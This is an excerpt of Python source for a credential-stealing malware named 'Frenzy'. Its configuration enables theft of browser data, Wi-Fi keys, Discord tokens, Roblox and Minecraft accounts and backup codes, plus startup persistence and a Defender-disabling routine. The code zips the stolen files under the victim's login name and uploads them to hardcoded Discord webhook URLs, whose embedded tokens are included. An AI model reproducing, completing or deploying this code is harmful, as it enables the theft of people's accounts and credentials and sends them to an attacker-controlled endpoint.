...
__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1153564903836241930/qW84_-R_s7dbJtGgYvyUkPS010T2vEp4lN_c4HzotRiBH4obs9kBnoDwx9zjMSTTcg6G', 'ping': True, 'pingtype': 'Everyone', 'fakeerror': False, 'startup': True, 'defender': False, 'systeminfo': True, 'backupcodes': True, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': False, 'minecraft': True, 'wifi': True, 'killprotector': False, 'antidebug_vm': False, 'discord': True, 'anti_spam': False, 'self_destruct': False}
whook = Webhook("https://discord.com/api/webhooks/1153565188075831367/fy5EQBWbq0itYmf7XeheqtJF73hqzk5952cKDR65kXA7Ilw5C-c3OtCZ04XujU8n4359")
#global variables
temp = os.getenv("temp")
...
def main(webhook: str):
    threads = [Browsers, Wifi, Minecraft, BackupCodes, killprotector, startup, disable_defender]
    configcheck(threads)
    ...
    data = {
        "username": "Frenzy",
        "avatar_url": "https://cdn.discordapp.com/attachments/1153695279544021103/1153784080782077963/Screenshot_20230831_012635_TikTok.jpg"
    }
    ...
    if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes"]):
        with open(_file, 'rb') as file:
            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Frenzy-Logged-{os.getlogin()}.zip', file, 'application/zip')})
...
def zipup():
    _zipfile = os.path.join(localappdata, f'Frenzy-Logged-{os.getlogin()}.zip')
            ...
            "embeds": [
                {
                    ...
                    "thumbnail": {
                        "url": "https://media.discordapp.net/attachments/1149836379845574766/1152268241662648362/money-broke1.gif"
                    }
                }
            ],
            "username": "Frenzy",
            "avatar_url": "https://media.discordapp.net/attachments/1149836379845574766/1152268241662648362/money-broke1.gif"
        }
